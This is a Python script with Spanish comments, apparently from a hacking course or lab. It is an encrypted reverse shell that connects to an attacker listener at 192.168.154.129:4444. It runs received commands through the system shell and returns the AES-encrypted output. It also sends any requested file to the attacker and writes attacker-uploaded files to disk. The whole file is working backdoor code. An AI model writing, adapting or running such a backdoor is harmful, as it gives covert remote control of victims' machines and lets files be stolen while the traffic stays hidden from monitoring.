#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess,socket
import base64
import time
import os
import sys

# se cifra con AES y se codifica con base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# se genera una clave secreta aleatoria
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# create a cipher object using the random secret
cipher = AES.new(secret,AES.MODE_CFB)

# cifrar y codificar una cadena
# encoded = EncodeAES(cipher, 'password')
# print 'cadena cifrada:', encoded

# descifrar y decodificar la cadena cifrada
# decoded = DecodeAES(cipher, encoded)
# print 'cadena descifrada:', decoded

# Configuracion donde escucha el atacante
HOST = '192.168.154.129'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

saludo = EncodeAES(cipher, 'Empieza la fiesta! Follow the white rabbit!EOF')
s.send(saludo)

while True:
	# Se reciben los datos del comando cifrados
	data = s.recv(1024)
	
	# Se descifran los datos
	descifrado = DecodeAES(cipher, data)

	# Si el comando es salir
	if descifrado.startswith("salir") == True:
		sendData = "Salir. \n EOF"
		cifData = EncodeAES(cipher, sendData)
		s.send(cifData)
		sys.exit()

	# Si el comando es download
	elif descifrado.startswith("download") == True:

		# Se obtiene el valor del fichero quitando download y espacio
		sendFile = descifrado[9:]

		# Transferencia del fichero en modo lectura binario
		with open(sendFile, 'rb') as f:
			while 1:
				fileData = f.read()
				# Si se ha llegado al final del fichero salir del bucle while
				if fileData == '': break
				# Comienza el envio del fichero
				s.sendall(fileData)
		f.close()
		time.sleep(0.8)
		
		# Se indica al servidor atacante que ya se ha terminado la transferencia
		s.sendall('EOF')
		time.sleep(0.8)
		s.sendall(EncodeAES(cipher, 'Descarga finalizada.EOF'))
	
	elif descifrado.startswith("upload") == True:

		# Se establece el nombre del fichero a subir quitando upload y espacio
		downFile = descifrado[7:]

		# Se abre el fichero en modo escritura binario
		g = open(downFile, 'wb')

		# Bucle de subida del fichero
		while True:
			l = s.recv(1024)
			while (l):
				# Si el paquete que estoy leyendo es el ultimo quito el EOF, lo escribo y termino
				if l.endswith("EOF"):
					u = l[:-3]
					g.write(u)
					break
				else:
					g.write(l)
					l = s.recv(1024)
			break
		g.close()
		time.sleep(0.8)

		# se indica al servidor atacante que se ha terminado la subida
		s.sendall(EncodeAES(cipher, 'Subida finalizada.EOF'))


	else:
		# Ejecutar el comando
		proc = subprocess.Popen(descifrado, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

		# Se guarda la salida del comando
		stdoutput = proc.stdout.read() + proc.stderr.read() + 'EOF'
	
		# Se cifra la salida
		cifrado = EncodeAES(cipher, stdoutput)
	
		# Se envia la salida cifrada
		s.send(cifrado)


s.close()
